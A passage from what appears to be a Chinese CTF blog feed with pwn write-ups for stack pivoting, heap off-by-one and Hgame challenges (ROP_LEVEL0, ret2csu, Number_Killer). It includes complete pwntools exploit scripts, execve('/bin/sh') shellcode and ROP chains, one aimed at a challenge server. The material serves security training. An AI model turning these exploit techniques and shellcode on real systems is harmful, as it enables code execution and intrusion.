alt="img"></p><p>我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：</p><p>推算shellcode放置的地址</p><p>跳转到shellcode放置的位置</p><p>首先，第一点，shellcode的位置就是发射payload的时候esp_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp_old的地址为0x20+4(ebp)+4(ret_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。</p><p>对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp esp这个操作，来让程序流获得在栈上执行的先河。</p><blockquote><p>$ ROPgadget –binary stack_pivoting_1 –only ‘jmp|ret’ | grep ‘esp’</p><p>0x08048504 : jmp esp</p></blockquote><p>发现只有这么一个地址。0x08048504。这也正是图中的位置。注意，当我们取出ret_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp_old的位置。</p><p>在这里，我们直接可以选择让pwntools产生可执行的代码”sub  esp 0x28; jmp esp”。注意，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。</p><p>最后的EXP按照下面这样布置：</p><blockquote><p>from pwn import *</p><p>sh = process(‘./pwn6’)</p><p>shellcode_x86 = “\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73”</p><p>shellcode_x86 += “\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0”</p><p>shellcode_x86 += “\x0b\xcd\x80”</p><p>sub_esp_jmp = asm(‘sub esp, 0x28;jmp esp’)</p><p>jmp_esp = 0x08048504</p><p>payload = shellcode_x86 + (</p><p>0x20 - len(shellcode_x86)) * ‘b’ + ‘bbbb’ + p32(jmp_esp) + sub_esp_jmp</p><p>sh.sendline(payload)</p><p>sh.interactive()</p></blockquote><p>注意，这里我们又启用了另外一段代码：</p><p>它更加短，只有21个字节。Shellcode越短是越好的。它的汇编对应如下：</p><blockquote><p>shellcode_x86 = “\x31\xc9”          # xor   ecx, ecx</p><p>shellcode_x86 += “\xf7\xe1”       # mul   ecx</p><p>shellcode_x86 += “\x51”       # push  ecx</p><p>shellcode_x86 += “\x68\x2f\x2f\x73\x68” # push 0x68732f2f</p><p>shellcode_x86 += “\x68\x2f\x62\x69\x6e” # push 0x6e69622f </p><p>shellcode_x86 += “\x89\xe3”       # mov   ebx, esp</p><p>shellcode_x86 += “\xb0\x0b”       # moval, 0xb</p><p>shellcode_x86 += “\xcd\x80” # int 0x80</p></blockquote><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>1、编辑功能是否存在溢出</p><p>2、delete地方是否存在多重释放漏洞，删除了节点之后有没有清0</p><p>​    检查了节点是否存在，就不能double free</p><p>​    heaparray[v1] = 0LL 清零了</p><p>3、在show函数中有没有检查节点是否存在</p><p>v0[1] = malloc(size) 没有对大小限制也算漏洞</p><p>只有分配大小不能被2*sizeof(size_t)时才会把下一块chunk的prev_size当作自己的内容区域</p><h3 id="off-by-one-漏洞"><a href="#off-by-one-漏洞" class="headerlink" title="off by one 漏洞"></a>off by one 漏洞</h3><p><strong>要使用off by one，malloc大小不能是16的倍数（64位情况下）</strong></p><p>read_input(*(headparray[v1] + 1), *heaparray[v1] + 1LL);</p><p>能够修改下一块chunk的size字段，这种情况一般被称为堆扩展技术</p><img src="/2020/01/28/pwn_by_examples/image-20200126175331744.png" class="" title="image-20200126175331744"><img src="/2020/01/28/pwn_by_examples/image-20200126175341238.png" class="" title="image-20200126175341238"><img src="/2020/01/28/pwn_by_examples/image-20200126181904887.png" class="" title="image-20200126181904887">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
      <category>教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hgame</title>
    <link href="/2020/01/28/Hgame/"/>
    <url>/2020/01/28/Hgame/</url>
    
    <content type="html"><![CDATA[<h2 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h2><img src="/2020/01/28/Hgame/image-20200116233004577.png" class="" title="image-20200116233004577"><img src="/2020/01/28/Hgame/image-20200116233016869.png" class="" title="image-20200116233016869"><p>V5在-0x31，s在-0xAC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sh.recvuntil(<span class="hljs-string">&quot;Let&#x27;s 0O0o\\0O0!&quot;</span>)<br>payload=<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">0xAC</span> - <span class="hljs-number">0x31</span>)<br>payload += <span class="hljs-string">&#x27;0O0o\x00O0&#x27;</span><br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h2><img src="/2020/01/28/Hgame/image-20200117005607628.png" class="" title="image-20200117005607628"><img src="/2020/01/28/Hgame/image-20200117005622807.png" class="" title="image-20200117005622807"><p>0xE0 - 0xC0之后刚好是32位，这样第</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = cyclic(<span class="hljs-number">0xE0</span> - <span class="hljs-number">0xC0</span>)<br>sh.send(payload)<br>sh.recvuntil(<span class="hljs-string">&quot;shot!\n&quot;</span>)<br>payload = <span class="hljs-built_in">str</span>(<span class="hljs-number">6295776</span>)<br>sh.send(payload)<br></code></pre></td></tr></table></figure><h2 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h2><h2 id="open-read-puts"><a href="#open-read-puts" class="headerlink" title="open_read_puts"></a>open_read_puts</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./ROP_LEVEL0&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./ROP_LEVEL0&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>        <span class="hljs-comment">#lib = ELF(&#x27;./home/robye/Desktop/PWN/libc/64-libc-2.27.so&#x27;)</span><br>    pop_rsi_r15_ret = <span class="hljs-number">0x400751</span> <br>    pop_rdi_ret = <span class="hljs-number">0x400753</span><br>    buf = <span class="hljs-number">0x601060</span><br>    open_plt = elf.plt[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    open_addr = <span class="hljs-number">0x4006A3</span><br>    payload = cyclic(<span class="hljs-number">0x50</span>+ <span class="hljs-number">8</span>)<br>    payload += p64(pop_rsi_r15_ret)<br>    payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>    payload += p64(<span class="hljs-number">0xdeadbeef</span>)<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    <br>    payload += p64(pop_rdi_ret)<br>    payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>    payload += p64(pop_rsi_r15_ret)<br>    payload += p64(<span class="hljs-number">0</span>)<br>    payload += p64(<span class="hljs-number">0</span>)<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;open&#x27;</span>])<br>    payload += p64(pop_rdi_ret)<br>    payload += p64(<span class="hljs-number">6</span>)<br>    payload += p64(pop_rsi_r15_ret)<br>    payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>    payload += p64(<span class="hljs-number">0</span>)<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    payload += p64(pop_rdi_ret)<br>    payload += p64(elf.bss()+<span class="hljs-number">0x100</span>)<br>    payload += p64(<span class="hljs-number">0x4004e0</span>)<span class="hljs-comment">#puts_plt</span><br>    sh.sendline(payload)<br>    sleep(<span class="hljs-number">0.5</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;./flag&quot;</span>)<br>    sh.send(<span class="hljs-string">&quot;./flag\x00&quot;</span>)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;47.103.214.163&quot;</span>,<span class="hljs-number">20003</span>,<span class="hljs-number">1</span> )<br><br></code></pre></td></tr></table></figure><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><img src="/2020/01/28/Hgame/image-20200117183339217.png" class="" title="image-20200117183339217"><p>ROP_LEVEL0| SOLVED| ww        </p><img src="/2020/01/28/Hgame/92YAf7bVfc8a3fUf__thumbnail.png" class="" title="img">      重复利用此处的gadget调用read， open， puts将flag输出就行<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span> <span class="hljs-comment">#!/usr/bin/python2</span><br> <span class="hljs-number">2</span> <br> <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">4</span> <span class="hljs-keyword">import</span> sys<br> <span class="hljs-number">5</span> <span class="hljs-keyword">import</span> os<br> <span class="hljs-number">6</span> <br> <span class="hljs-number">7</span> <span class="hljs-comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br> <span class="hljs-number">8</span> context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br> <span class="hljs-number">9</span> context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-number">10</span> debug = <span class="hljs-number">0</span><br><span class="hljs-number">11</span> d = <span class="hljs-number">1</span><br><span class="hljs-number">12</span> <br><span class="hljs-number">13</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br><span class="hljs-number">14</span>     execve = <span class="hljs-string">&quot;./ROP_LEVEL0&quot;</span><br><span class="hljs-number">15</span>     <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br><span class="hljs-number">16</span>         p = process(execve)<br><span class="hljs-number">17</span>         <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br><span class="hljs-number">18</span>             gdb.attach(p)<br><span class="hljs-number">19</span>     <span class="hljs-keyword">else</span>:<br><br><br><span class="hljs-number">20</span>         <span class="hljs-comment">#ip = &quot;10.0.%s.140&quot; % sys.argv[1]</span><br><span class="hljs-number">21</span>         ip = <span class="hljs-string">&quot;47.103.214.163&quot;</span><br><span class="hljs-number">22</span>         host = <span class="hljs-string">&quot;20003&quot;</span><br><span class="hljs-number">23</span>         p = remote(ip, host)<br><span class="hljs-number">24</span> <br><span class="hljs-number">25</span>     elf = ELF(<span class="hljs-string">&quot;./ROP_LEVEL0&quot;</span>)<br><span class="hljs-number">26</span> <br><span class="hljs-number">27</span>     main = <span class="hljs-number">0x40065B</span><br><span class="hljs-number">28</span>     loc1 = <span class="hljs-number">0x400730</span><br><span class="hljs-number">29</span>     loc2 = <span class="hljs-number">0x40074A</span><br><span class="hljs-number">30</span> <br><span class="hljs-number">31</span>     payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(loc2)<br><span class="hljs-number">32</span>     payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x10</span>) + p64(elf.bss()+<span class="hljs-number">0x200</span>) + p64(<span class="hljs-number">0</span>) + p64(loc1)<br><span class="hljs-number">33</span>     payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(main)<br><span class="hljs-number">34</span>     p.sendafter(<span class="hljs-string">&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;</span>, payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-number">35</span> <br><span class="hljs-number">36</span>     p.sendline(<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><span class="hljs-number">37</span> <br><span class="hljs-number">38</span>     payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(loc2)<br><span class="hljs-number">39</span>     payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;open&#x27;</span>]) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(elf.bss()+<span class="hljs-number">0x200</span>) + p64(loc1)<br><span class="hljs-number">40</span>     payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(main)<br><span class="hljs-number">41</span>     p.sendafter(<span class="hljs-string">&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;</span>, payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-number">42</span> <br><span class="hljs-number">43</span>     raw_input()<br><span class="hljs-number">44</span>     payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(loc2)<br><span class="hljs-number">45</span>     payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x60</span>) + p64(elf.bss()+<span class="hljs-number">0x220</span>) + p64(<span class="hljs-number">5</span>) + p64(loc1)<br><span class="hljs-number">46</span>     payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(main)<br><span class="hljs-number">47</span>     p.sendafter(<span class="hljs-string">&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;</span>, payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-number">48</span> <br><span class="hljs-number">49</span>     payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>) + p64(loc2)<br><span class="hljs-number">50</span>     payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(elf.bss() + <span class="hljs-number">0x220</span>) + p64(loc1)<br><span class="hljs-number">51</span>     payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(main)<br><span class="hljs-number">52</span>     p.sendafter(<span class="hljs-string">&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;</span>, payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-number">53</span> <br><span class="hljs-number">54</span>     p.interactive()<br><span class="hljs-number">55</span> <br><span class="hljs-number">56</span> <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><span class="hljs-number">57</span>     pwn()<br></code></pre></td></tr></table></figure><p><a href="http://www.qfrost.com:4000/PWN/万能gadget/">http://www.qfrost.com:4000/PWN/%E4%B8%87%E8%83%BDgadget/</a></p><h2 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123; <br><span class="hljs-comment">//char str[20];</span><br>    <span class="hljs-keyword">long</span> str = <span class="hljs-number">0x40078d</span>;<br>    <span class="hljs-keyword">long</span> temp;<br>    <span class="hljs-keyword">long</span> number = <span class="hljs-number">4196237L</span>;<br>    <span class="hljs-keyword">char</span> <span class="hljs-built_in">string</span>[<span class="hljs-number">20</span>];<br>    temp = atol(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;十进制：%d&quot;</span>,str);<br>    <span class="hljs-comment">//printf(&quot;转换前：%s ,转换后：%d\n&quot;,str,atol(str));</span><br>    temp = number;<br>    itoa(number, <span class="hljs-built_in">string</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-comment">//printf(&quot;转换前：%d,转换后：%s&quot;,temp,string);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127180305749.png" class="" title="image-20200127180305749"><img src="/2020/01/28/Hgame/image-20200127180319641.png" class="" title="image-20200127180319641"><img src="/2020/01/28/Hgame/image-20200127180517996.png" class="" title="image-20200127180517996"><img src="/2020/01/28/Hgame/image-20200127180441992.png" class="" title="image-20200127180441992"><p>没有NX加上有jump rsp，那就肯定ret2shellcode</p><p>因为atoll，所以不能直接发shellcode</p><p>先看一下偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    sh.sendline(<span class="hljs-built_in">str</span>(i))<br>    sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127181655275.png" class="" title="image-20200127181655275"><p>看见c,d,e,f,那里，再测一次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">13</span>):<br>    sh.sendline(<span class="hljs-built_in">str</span>(i))<br>    sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127184537470.png" class="" title="image-20200127184537470"><p>现在我们还看见了一个1，可能是用来记录循环次数的？</p><p>然后我们要构建栈，就得按照</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">gadget = [<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0x000000000040078D</span>,<span class="hljs-comment">#jmp rsp</span><br>        <span class="hljs-number">0x622fbf4856f63148</span>,<span class="hljs-comment">#shellcode</span><br>        <span class="hljs-number">0x545768732f2f6e69</span>,<br>        <span class="hljs-number">0x0000050f993bb05f</span>,<br>]<br><br></code></pre></td></tr></table></figure><p>这样来构建</p><blockquote><img src="/2020/01/28/Hgame/image-20200127191618340.png" class="" title="image-20200127191618340"></blockquote><img src="/2020/01/28/Hgame/image-20200127193319645.png" class="" title="image-20200127193319645"><p>这样我们看见那个0，好像放在了最下面，并且栈中还存留有56789a，所以把gadget修改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">gadget = [<br>        <span class="hljs-number">0xdeadbeef</span>,<br>        <span class="hljs-number">0x000000000040078D</span>,<span class="hljs-comment">#jmp rsp</span><br>        <span class="hljs-number">0x622fbf4856f63148</span>,<span class="hljs-comment">#shellcode</span><br>        <span class="hljs-number">0x545768732f2f6e69</span>,<br>        <span class="hljs-number">0x0000050f993bb05f</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>]<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127194207809.png" class="" title="image-20200127194207809"><p>这样就没有问题啦，然后就是如何退出循环了</p><p>这里我们可以看见循环次数已经变成了b<img src="/2020/01/28/Hgame/image-20200127195248873.png" class="" title="image-20200127195248873"></p><p>但如果我们继续发送的话，又会变成1<img src="/2020/01/28/Hgame/image-20200127200302561.png" class="" title="image-20200127200302561"></p><p>经过调试之后，只有<code>sendNum((11&lt;&lt;32))</code>可以将b+1变成c，否则会重新开始循环打乱栈内布局</p><p>随后，发送</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>,<span class="hljs-number">20</span>):<br>    sendNum(i)<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127202553944.png" class="" title="image-20200127202553944"><p>然后发现立马就可以运行第一行…..</p><p>我们需要把rbp指针指向之前我们放好了的地方，所以计算一下栈偏移，然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a = asm(<span class="hljs-string">&#x27;sub rsp,0x60;ret&#x27;</span>)<br>b = disasm(a)<br></code></pre></td></tr></table></figure><img src="/2020/01/28/Hgame/image-20200127205156957.png" class="" title="image-20200127205156957"><p>所以发送<code>sendNum(0xc360ec8348)</code>再使用gitf里的<img src="/2020/01/28/Hgame/image-20200127205325792.png" class="" title="image-20200127205325792"></p><p>完成跳转</p><p>随后，程序还需要读入六个数，然后即可</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>sh = process(<span class="hljs-string">&quot;./Number_Killer&quot;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&quot;numbers!\n&quot;</span>)<br>gadget = [<br>        <span class="hljs-number">0xdeadbeef</span>,<br>        <span class="hljs-number">0x000000000040078D</span>,<span class="hljs-comment">#jmp rsp</span><br>        <span class="hljs-number">0x622fbf4856f63148</span>,<span class="hljs-comment">#shellcode</span><br>        <span class="hljs-number">0x545768732f2f6e69</span>,<br>        <span class="hljs-number">0x0000050f993bb05f</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>    <span class="hljs-number">0xdeadbeef</span>,<br>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendNum</span>(<span class="hljs-params">num</span>):</span><br>    sh.sendline(<span class="hljs-built_in">str</span>(num))<br>    sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    sh.sendline(<span class="hljs-built_in">str</span>(i))<br>    sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> gadget:<br>    sendNum(i)<br><span class="hljs-comment">#pause()</span><br>sendNum((<span class="hljs-number">11</span>&lt;&lt;<span class="hljs-number">32</span>))<br>pause()<br>sendNum(<span class="hljs-number">0xc360ec8348</span>)<br>sendNum(<span class="hljs-number">0x400789</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    sh.sendline(<span class="hljs-built_in">str</span>(i))<br>    sleep(<span class="hljs-number">0.1</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Hgame</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_s_9</title>
    <link href="/2020/01/25/ciscn_2019_s_9/"/>
